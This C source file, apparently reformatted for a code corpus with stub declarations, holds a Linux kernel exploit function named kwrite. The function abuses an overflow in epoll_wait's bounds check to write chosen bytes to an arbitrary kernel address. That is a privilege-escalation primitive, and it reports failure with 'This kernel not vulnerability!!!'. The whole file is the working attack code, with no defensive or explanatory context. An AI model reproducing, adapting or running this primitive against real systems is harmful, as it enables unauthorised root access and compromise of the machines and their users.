#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct epoll_event {int events; int /*<<< orphan*/  data; } ;

/* Variables and functions */
 int /*<<< orphan*/  AF_UNIX ; 
 int DIV ; 
 int EPOLLERR ; 
 int EPOLLHUP ; 
 int EPOLLIN ; 
 int EPOLLOUT ; 
 int EPOLLPRI ; 
 int /*<<< orphan*/  EPOLL_CTL_ADD ; 
 int /*<<< orphan*/  EPOLL_CTL_MOD ; 
 int RES ; 
 int /*<<< orphan*/  SOCK_DGRAM ; 
 int* alloca (int) ; 
 int /*<<< orphan*/  close (int) ; 
 int dup2 (int,int) ; 
 int epoll_create (int) ; 
 int /*<<< orphan*/  epoll_ctl (int,int /*<<< orphan*/ ,int,struct epoll_event*) ; 
 int epoll_wait (int,void*,unsigned int,int) ; 
 int /*<<< orphan*/  fatal (char*) ; 
 int /*<<< orphan*/  memcpy (int /*<<< orphan*/ *,char*,int) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*,void*,char*,int) ; 
 int /*<<< orphan*/  send (int,char*,int,int /*<<< orphan*/ ) ; 
 scalar_t__ socketpair (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ,int*) ; 

__attribute__((used)) static int 
kwrite(unsigned base, char *buf, int num)
{
#define DIV 256
#define RES 4

int efd, c, i, fd;
int pi[2];
struct epoll_event ev;
int *stab;
unsigned long ptr;
int count;
unsigned magic = 0xffffffff / 12 + 1;

	printf("[+] kwrite base %p, buf %p,num %d\n", (void *)base,buf,num);
	/* initialize epoll */
	efd = epoll_create(4096);
	if (efd < 0)
		return -1;
	
	ev.events = EPOLLIN|EPOLLOUT|EPOLLPRI|EPOLLERR|EPOLLHUP;

	/* 12 bytes per fd + one more to be safely in stack space */
	count = (num+11)/12+RES;

	/* desc array */
	stab = alloca((count+DIV-1)/DIV*sizeof(int));

	for (i = 0; i < ((count+DIV-1)/DIV)+1; i++) 
	{

		if (socketpair(AF_UNIX, SOCK_DGRAM, 0, pi) < 0)
			return -1;

		send(pi[0], "a", 1, 0);
		stab[i] = pi[1];
	}

	/* highest fd and first descriptor */
	fd = pi[1];
	/* we've to allocate this separately because we need to have
	it's fd preserved - using this we'll be writing actual bytes */
	epoll_ctl(efd, EPOLL_CTL_ADD, fd, &ev);
	//printf("EPOLL_CTL_ADD count %u\n",count);
	for (i = 0, c = 0; i < (count-1); i++) 
	{
		int n;
		n = dup2(stab[i/DIV], fd+2+(i % DIV));
		if (n < 0)
			return -1;
		epoll_ctl(efd, EPOLL_CTL_ADD, n, &ev);
		close(n);
	}

	/* in 'n' we've the latest fd we're using to write data */
	for (i = 0; i < ((num+7)/8); i++) 
	{
		/* data being written from end */
		memcpy(&ev.data, buf + num - 8 - i * 8, 8);
		epoll_ctl(efd, EPOLL_CTL_MOD, fd, &ev);

		/* the actual kernel magic */
		ptr = (base + num - (i*8)) - (count * 12);
		struct epoll_event *events =(struct epoll_event *)ptr;
		//printf("epoll_wait verify_area(%p,%p) addr %p %p\n",ptr,magic* sizeof(struct epoll_event) ,&events[0].events,magic);
		int iret =epoll_wait(efd, (void *) ptr, magic, 31337);
		if (iret ==-1)
		{
			perror("epoll_wait");
			fatal("This kernel not vulnerability!!!");

		}
		/* don't ask why (rotten rb-trees) :) */
		if (i)
		{
			//printf("epoll_wait verify_area(%p,%p) %p\n",ptr,magic* sizeof(struct epoll_event) ,magic);
			iret = epoll_wait(efd, (void *)ptr, magic, 31337);
	                if (iret ==-1)
        	        {
                	       perror("epoll_wait");
				fatal("This kernel not vulnerability!!!");
	
        	        }

		}
	}

	close(efd);
	for (i = 3; i <= fd; i++)
		close(i);
	
	return 0;
	
}